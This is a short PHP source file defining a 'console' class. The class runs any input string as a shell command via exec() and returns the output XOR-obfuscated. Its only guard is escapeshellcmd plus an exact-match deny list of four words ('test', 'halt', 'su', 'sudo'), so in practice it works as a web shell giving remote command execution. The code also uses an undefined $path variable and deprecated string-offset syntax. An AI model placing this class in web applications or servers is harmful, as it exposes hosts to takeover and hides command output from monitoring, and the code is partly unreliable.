<?php
/**
* Console
*
* @author Nikolay Hristov <strikebg@gmail.com>
* @license Licensed under the MIT license.
* @version 1.0
*/
class console {

	private $output;
	private $input;
	private $deny = array('test','halt','su', 'sudo');

	function __construct( $input ) {
		$this->input = $this->sanitize($input);
		if(in_array($this->input,$this->deny)) {
			die($this->xorEncrypt('Not allowed command'));
		}
	} 

	private function sanitize( $string ) {
		$string = escapeshellcmd(rtrim(trim(strip_tags($string))));
		return $string;
	}
	
	private function output_format( array $output ) {
		$formatted = "";

		foreach( $output as $line ) {
			$formatted .= htmlentities($line) . "<br />";
		}
		return $formatted;
	}

	private function xorEncrypt( $string )
	{
		$strEncrypted = "";
		for($i=0;$i<strlen($string);$i++) $strEncrypted .= chr(6 ^ ord($string{$i}));
		return $strEncrypted;
	}

	public function execute() {
		$command = $this->input;
		$finalCommand = $path . $command;
		exec($finalCommand, $output);
		print $this->xorEncrypt($this->output_format($output));
	}

}

